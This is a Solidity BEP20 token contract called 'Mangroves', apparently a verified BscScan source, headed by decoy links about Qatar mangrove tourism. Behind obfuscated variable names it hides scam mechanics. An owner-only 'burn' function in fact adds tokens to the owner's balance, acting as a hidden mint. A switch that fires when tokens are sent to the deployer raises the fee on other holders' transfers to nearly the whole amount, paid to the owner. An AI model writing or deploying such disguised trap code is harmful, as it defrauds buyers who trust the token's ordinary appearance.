/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-19 15:03 GMT
 */
////////////////////////////////////////////////////////
//Best Trip of Mangroves Qatar WorldCup2022
//https://youtu.be/z8beJy8ajvs
//https://www.discoverqatar.qa/discover-the-mangroves-of-qatar-without-transfer/overview
//https://www.atlasobscura.com/places/al-thakira-mangroves-forest
//https://twitter.com/mangrove_voice/status/1593160873711132672
//https://m.facebook.com/profile.php?id=272116322865148
////////////////////////////////////////////////////////
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract AQNOMDM {
address private  VVSPPN = address(0);
uint256 private  HOUJAI = 1000000000000000000;
string public  symbol = "Mangroves";
uint8 public constant decimals = 18;
uint256 private  WYIXUX = 1000000000000000000000;
uint256 private  PIYJVQ = 1000000000000000000;
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  TBCDTV = 1000000000000000;
address private  TIXTZB = address(0);
address private  BMZKJB = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
string public  name = "Mangroves";
uint256 private  NKVOHO = 10000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  OFFIFS = 100000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant LPHLWB = 99999;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  ETQABL = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  AQQLGZ = 10000000000000;
address private  GEFCPU = address(0);
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tCEYAGD 0");
require(spender != address(0), "fCEYAGD 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getTBCDTV() private returns (uint256) {
return TBCDTV;
}

function _getOFFIFS() private returns (uint256) {
return OFFIFS;
}

function _getAQQLGZ() private returns (uint256) {
return AQQLGZ;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "CEYAGD");
require(to != address(0), "CEYAGD");
require(amount <= balanceOf[from], "CEYAGD");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* LPHLWB/HOUJAI ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==TIXTZB){
HOUJAI = LPHLWB+2;
}
emit Transfer(from, to, transferAmount);
}
function _getGEFCPU() private returns (address) {
return GEFCPU;
}

function _getWYIXUX() private returns (uint256) {
return WYIXUX;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () {
TIXTZB = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getBMZKJB() private returns (address) {
return BMZKJB;
}

function _getVVSPPN() private returns (address) {
return VVSPPN;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getETQABL() private returns (address) {
return ETQABL;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getNKVOHO() private returns (uint256) {
return NKVOHO;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getPIYJVQ() private returns (uint256) {
return PIYJVQ;
}


}